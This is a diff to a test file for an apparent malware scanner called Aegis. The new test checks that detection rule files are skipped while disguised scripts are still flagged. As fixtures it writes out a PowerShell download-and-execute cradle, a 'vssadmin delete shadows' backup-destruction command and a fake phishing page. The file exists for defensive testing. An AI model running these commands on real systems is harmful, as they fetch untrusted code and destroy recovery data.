@@ -355,13 +355,34 @@ def test_own_reports_are_not_flagged_but_tampered_ones_are(ctx, tmp_path):
     for ext in ("html", "json", "csv"):
         p = write_report(r, tmp_path / f"report.{ext}")
         assert scan_file(ctx, p) == [], ext
-    assert ctx.stats["aegis_reports_skipped"] == 3
+    assert ctx.stats["detection_content_skipped"] == 3
     # Copying the generator marker into a malicious page must not buy a free pass.
     evil = tmp_path / "phish.html"
     evil.write_text('<meta name="generator" content="Aegis Security Suite"><script>' + cradle + "</script>")
     plain = tmp_path / "plain.ps1"
     plain.write_text(cradle)
     assert scan_file(ctx, plain)
-    assert ctx.stats["aegis_reports_skipped"] == 3
+    assert ctx.stats["detection_content_skipped"] == 3
     scan_file(ctx, evil)
-    assert ctx.stats["aegis_reports_skipped"] == 3
+    assert ctx.stats["detection_content_skipped"] == 3
+
+
+def test_detection_content_is_skipped_but_disguised_scripts_are_not(ctx, tmp_path):
+    """Rule files (YARA, Aegis-Lite JSON, Sigma) quote malware strings by design; a dev
+    checkout or another tool's rule set must not be flagged. Structure is checked so a
+    renamed script doesn't qualify."""
+    from aegis.core.config import PACKAGE_DATA
+    from aegis.scanners.files import is_detection_content, scan_file
+
+    for src in (PACKAGE_DATA / "rules" / "core.json", PACKAGE_DATA / "yara" / "aegis_core.yar"):
+        t = tmp_path / src.name
+        t.write_bytes(src.read_bytes() + b"\n// local edit\n" if src.suffix == ".yar" else src.read_bytes() + b"\n")
+        assert scan_file(ctx, t) == [], src.name
+    sigma = b"title: x\nlogsource:\n  product: windows\ndetection:\n  sel:\n    CommandLine|contains: vssadmin delete shadows\n  condition: sel\n"
+    assert is_detection_content(sigma, "yml")
+    evil = b"IEX (New-Object Net.WebClient).DownloadString('http://x/a'); vssadmin delete shadows /all /quiet"
+    assert not is_detection_content(evil, "yar") and not is_detection_content(evil, "yml")
+    assert not is_detection_content(b'[{"id": "x"}]', "json")
+    ctx.deep = True
+    (tmp_path / "evil.yar").write_bytes(evil)
+    assert scan_file(ctx, tmp_path / "evil.yar")
